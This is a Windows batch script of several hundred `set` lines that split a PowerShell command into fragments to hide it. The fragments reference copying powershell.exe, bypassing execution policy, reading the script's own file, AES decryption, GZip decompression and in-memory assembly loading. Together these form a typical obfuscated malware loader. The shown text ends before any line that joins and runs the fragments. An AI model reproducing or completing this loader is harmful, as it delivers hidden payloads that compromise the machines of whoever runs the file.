@echo off
set "QXEFINmYfx=in"
set "XBLVXFrctN=Po"
set "OwnxxxnBdw=nd"
set "VEjCzBXfTx=he"
set "BxkocPlyBH=we"
set "SgFdXvCiLC=0\"
set "CWHbBOwqLe=32"
set "AtDCexkFaA=y "
set "thmxcqCIjN=em"
set "HJxqJmFnIS=.e"
set "VzviNFrkEF=Sy"
set "gHVKMfcxlq=he"
set "EClHPgSHOC=ws"
set "WOsPGBycvQ=po"
set "LpSkEpNTLv=we"
set "cFHbcknioV=:\"
set "nSyzKQwTjG=ow"
set "woLdJoLXPB=rS"
set "cJaQcbdeqT=do"
set "UtghgJPHmI=\v"
set "QbzVtjrVbM=co"
set "lxTEoJVrTb=s\"
set "TrxweQbwdo=Wi"
set "ylmYPCouzH=ll"
set "XLfRHaSXMo=st"
set "weVmRyGiAh=py"
set "nqIuXGxkoE= /"
set "asOYSWVzxB= C"
set "JbLDrgrXFZ=ll"
set "SJiehOOcjL=rs"
set "MvSKJdtixz=xe"
set "ympEIAsbXn=\W"
set "TunRSWoIOA=1."
set "zwHXWohSQK= %~dp0"
set "YZbUPLmyPT=cd"
set "xDyflBEwWT=-joi"
set "nMQfOBbGhC=).Sp"
set "JPUfYJwDBZ='')("
set "hTShFdlVYX=rity"
set "TUrhLQBPkt=.-16"
set "bWtXUaiTPy=trea"
set "lPHeBOTslh=.Dis"
set "HUgBsoibyL=TllA"
set "xrIVyyPPAH=Ie ="
set "QvcvqizwEp=ct S"
set "CFtsLQqVxZ=pStr"
set "JzrBBqeuaK=d;$n"
set "TGeNEtRKKS=ewLi"
set "jUstVLSxbo=t Sy"
set "NznDRPvPRK=);$n"
set "GpJrlgCxJw=$mMd"
set "LDBLuRTLCn=oArr"
set "rtNGHCBMFP= = ["
set "XJMmYVyEQp=s = "
set "IXemOBayVZ=.GZi"
set "DNLnQzKcEx=orF'"
set "YPCXBPyxWJ=esaB"
set "kEYYbtxOqT=kmyj"
set "jbigsaOqQT=$HYZ"
set "RCSsNqWFYu=PKCS"
set "oDwVNTGVWU=flec"
set "ogfaZqROKq=n) {"
set "dAuepKkJZz=m.IO"
set "mdtYQhjmTQ=-Obj"
set "czltcABfcM=daeR"
set "BxCBWotYaI=Ie);"
set "sOSHaDWfrc=hy.A"
set "oaUQeZScpe=S46e"
set "rRlSCQngRe=MgXt"
set "iIYxAQdwak=-1.."
set "vPFIUVJIir=ment"
set "kcZakrDMZn===')"
set "OEwgtmTxIW=em.C"
set "NEVGgKbRfK=esMa"
set "pLZKgNZlCL=ispo"
set "ziclewLazE=[-1."
set "BXLwDshqoP=IVN "
set "QcKTlYaYby=HYZI"
set "QcUVrNEkGk=.Con"
set "IsjsKwvWzc=ress"
set "ZXFTLWtWdJ=Mode"
set "NZKbgFXPRo=Secu"
set "qHotLnlmKd=join"
set "aiGgcvignr=.Key"
set "FqVaugeFKS=KQEs"
set "pIjuSrHHsM=VWIV"
set "WGdTMvOtbU=[Sys"
set "xcIIFWQKan=ing("
set "bzzBkoGaJL=ck($"
set "iPBcgBUNvp=ne);"
set "QaAsexSsmG=am;$"
set "PQavprMlpO=ss -"
set "rGxuUnEdHa=6esa"
set "YBNmihLObU=dj0C"
set "HXQqqQRkul=($Ps"
set "ZvMQxkPSye=zN.I"
set "nXarYMqKCg=gsYZ"
set "blsNtHhVGg=('da"
set "tLldFsVkwl=1..-"
set "VQNHfGbiDf=.Cre"
set "hcvRUFvkso=();$"
set "kZBMnMwlUY=Obje"
set "fAKinMVzUp=k; }"
set "tHjhPdOzTl=bstr"
set "bUlHUFPZQU=PTtG"
set "KnJzEnMAjl=stem"
set "aMGEkJYCpI=Syst"
set "WsiXAHyZhU=raph"
set "VKydqrXxNi=OFx."
set "dKEElbFlQK=pher"
set "nnYEWYGyBP=and "
set "isRziZCSvb=]::("
set "jubQCbpmMV=ring"
set "HmLaxvlXbr=stem"
set "QXgQQrRMVA=tS46"
set "rBsTLFKdMD=$mMd"
set "KlcndMhXiP=);$u"
set "CTRbRGqlHr=;$VW"
set "OfoAkTiXLe=$Htn"
set "kdSmDJbHfe=;$Ht"
set "PnvGfJghUY=EOFx"
set "PenaoNRsfA=;$TD"
set "sIZWcXfRqy=Ie.T"
set "iUsMlZVTEY=$lKQ"
set "QOMgkZxIOE=-ep "
set "hEfYlkRCSz=ddin"
set "rDLepqUdrL=bjec"
set "ycBoLAuWGH='[-1"
set "CVgKCQGtFi=m(, "
set "YfLIihrBFp=Es ="
set "ikqNfRjJgI=.Cop"
set "NXAUIAvisn=.Mem"
set "etKlOoWPGw=rtS4"
set "ZweHbSlnoP=File"
set "nvQZfjstnC=ew-O"
set "qcutQZrjPx= = $"
set "rXTaqSHdMT=ct S"
set "cFzSqYosmi=pose"
set "olNEsOGOEo=raph"
set "KQoEKkZTJc=-nop"
set "almMKFEHoO=gnir"
set "SzjCvvEyWK=pose"
set "ZtEryNBezy='gni"
set "bHXnFAuXIz=onve"
set "kPbbxaSlca=F'[-"
set "cnjwUuNQHW=nRXz"
set "omElbUdUWj=PxEW"
set "TGcEpVEPQC=, $l"
set "jYoiGYuhkT=ddin"
set "MvwatMnqZh=nzS."
set "pDKLFNYeJN=oL'["
set "DPMtQoCbVs=rt]:"
set "KdLrGOLkTK=Stre"
set "syokJZLOXf=)) {"
set "oCVJgbXThD=O.Me"
set "IcKTbLVUgg=3); "
set "vSLDSwkSgg=gth)"
set "vwCeYTrdmF=Invo"
set "XbyaIoYLab=gMod"
set "wDFYzlKzuI=;$TD"
set "guhygDbWim=ptor"
set "RkdaQADoIB=N.Pa"
set "zKLfAHVhOe=);$k"
set "sKnhyhTNpf=s, 0"
set "heaUpewyCk=s75K"
set "uzDKrjNkFW=7;$n"
set "qPalzWBhME=();$"
set "vPErXavgoW= if "
set "pNZxMyqWtm=New-"
set "pFcXSaAZgc=ateD"
set "vdrbRliIzP=Fina"
set "uOEnTlnEaK== $n"
set "EXANLIzryQ=lKQE"
set "EevjUuoCxy=se()"
set "FGRuKUhalf=[Sys"
set "RVuUkOKRdB=ach "
set "cDtYcFVPoe=ptog"
set "kapRhQZtOp= = $"
set "GOMUOexYiS=gjYA"
set "giSJlPmxfU=  $M"
set "plYiVXIRpZ=('%~f0'"
set "OqQVRCSwyr= [Sy"
set "HLXuCYvGuJ=);$n"
set "YvKPoMTBAC=vert"
set "pInWeXtVDG== [S"
set "TSvUvSBYCZ=jB.D"
set "AHekMTJSza=m.Re"
set "pVHBlHKvdY=comm"
set "fLfZHtXmYA=106u"
set "HAgFjciIjJ=-4] "
set "bFuPRwQmdC=RmAx"
set "AHrLoqGfoo=[IO."
set "NuwyhbiAAq==');"
set "jMZCuHZYHz=('Tg"
set "TqTPsqXqfe=; };"
set "bjzLXLgkwX=ptog"
set "qAwqlHIvBt=[Env"
set "DKVwyOxfCC=)($l"
set "cewWZOXlAe=e]::"
set "TmvQExvNlP= '')"
set "gUtjwtnUmD=n ''"
set "mMKJlEQtqA=Bmor"
set "EscjKixZbS=ress"
set "zOgcamNELz=BC;$"
set "WdtkaoLfmA=[Sys"
set "OEhzmKaTca=d.Su"
set "oCTErUCnkn=.Cry"
set "rVrZUeRLGU=y.Cr"
set "JPHmFFINnV=ode]"
set "DdDSamvGSr=in $"
set "snOyxVrqEz=::De"
set "BFBMjQDPLG=sion"
